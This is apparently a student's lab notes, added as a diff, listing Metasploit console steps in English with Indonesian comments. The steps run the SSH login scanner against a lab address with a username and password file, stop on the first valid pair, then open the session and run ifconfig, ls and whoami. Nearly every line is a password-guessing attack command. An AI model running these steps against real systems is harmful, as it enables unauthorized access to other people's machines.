@@ -1,0 +1,29 @@
+1. search scanner/ssh
+
+#masuk ke backdoor
+2. use auxiliary/scanner/ssh/ssh_login
+
+3. options
+
+4. set rhost 192.168.56.101
+
+#siapkan file txt untuk passfile
+5. set userpass_file /home/student/passfile.txt
+
+#melihat setiap hasil yang kita dapatkan
+6. set verbose true
+
+#stop otomatis jika user dan pass matching
+7. set STOP_ON_SUCCESS true
+
+8. session -i
+
+9. session -i 2
+
+10. ifconfig
+
+11. ls
+
+12. whoami
+
+13. exit
